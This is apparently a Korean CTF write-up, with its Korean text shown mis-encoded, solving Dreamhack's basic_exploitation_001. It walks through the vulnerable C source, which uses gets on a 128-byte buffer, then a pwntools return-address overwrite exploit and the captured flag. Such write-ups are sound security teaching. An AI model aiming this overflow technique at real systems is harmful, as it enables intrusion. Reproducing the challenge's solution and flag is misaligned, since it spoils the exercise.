https://honey-push-30b.notion.site/basic_exploitation_001-9975e72a5a2d48b1a94556b4386192a3
# ë¬¸ì œíŒŒì¼ ë‹¤ìš´ë¡œë“œ

![ë¬¸ì œíŒŒì¼ ë‹¤ìš´ë¡œë“œ.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/21c7576b-d7bc-40d6-b0b6-9eab60373a31/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

basic_exploitation_001 ë¬¸ì œíŒŒì¼ì„ ë‹¤ìš´ë¡œë“œ ë°›ì„ ìˆ˜ ìˆë‹¤.

### **Environment**

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

i386-32-little ì¦‰ 32ë¹„íŠ¸ì´ë¯€ë¡œ 32ë¹„íŠ¸ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•´ì•¼í•œë‹¤.

NX enabledë¡œ ë˜ì–´ìˆëŠ”ë° ì´ëŠ” ìŠ¤íƒ,í™ ì˜ì—­ì—ì„œ ì‹¤í–‰ê¶Œí•œì„ ì œê±°í•˜ì—¬ ìŠ¤íƒì—ì„œ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¬ìˆ˜ ì—†ê²Œ í•œë‹¤. ê·¸ëŸ°ë° ì´ ë¬¸ì œì—ì„œëŠ” ì‹¤í–‰ì„ ëª©í‘œë¡œí•˜ëŠ” read_flagê°€ ìˆê³  codeì˜ì—­ì— ì´ë¯¸ ìœ„ì¹˜í•˜ë¯€ë¡œ ë³„ë¡œ ìƒê´€ì€ ì—†ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

ë²„í¼ì˜ í¬ê¸°ëŠ” 0x80(128)ì´ê³  getsë¡œ ë²„í¼ì— ì…ë ¥ì„ ë°›ëŠ”ë° ì…ë ¥ì˜ í¬ê¸°ë¥¼ ê²€ì¦í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤. read_flag ë¥¼ ì‹¤í–‰ì‹œí‚¤ë©´ ë˜ê¸° ë•Œë¬¸ì— 

ë²„í¼ì˜ í¬ê¸° 0x80

SFP 4ë°”ì´íŠ¸ 

read_flagì˜ ì£¼ì†Œë¡œ í•´ì£¼ë©´ ëœë‹¤.

```python
gdb-peda$ print read_flag
$1 = {<text variable, no debug info>} 0x80485b9 <read_flag>
```

read_flagì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚´ê¸°ìœ„í•´ì„œ printë¥¼ ì´ìš©í•´ì„œ ì£¼ì†Œê°’ì„ ì¶œë ¥í•˜ë©´ 0x80485b9ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.

```python
from pwn import *

p=remote('host1.dreamhack.games',18438)

payload=b'A'*132
payload+=p32(0x80485b9)

p.sendline(payload)

p.interactive()
```

ë”°ë¼ì„œ

ë²„í¼í¬ê¸° + SFPë¥¼ ë®ì„ 132ë°”ì´íŠ¸ì— 32ë¹„íŠ¸ì— ë§ê²Œ ë¦¬í‹€ì—”ë””ì–¸ìœ¼ë¡œ read_flagì˜ ì£¼ì†Œë¥¼ ë¶™ì—¬ì„œ ì „ì†¡í•´ì£¼ë©´ ëœë‹¤.

```python
â”Œâ”€â”€(rootğŸ’€kali)-[~/ë°”íƒ•í™”ë©´/basic_exploit_001]
â””â”€# python3 ./answer.py
[+] Opening connection to host1.dreamhack.games on port 18438: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive
$
```

í”Œë˜ê·¸ ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.
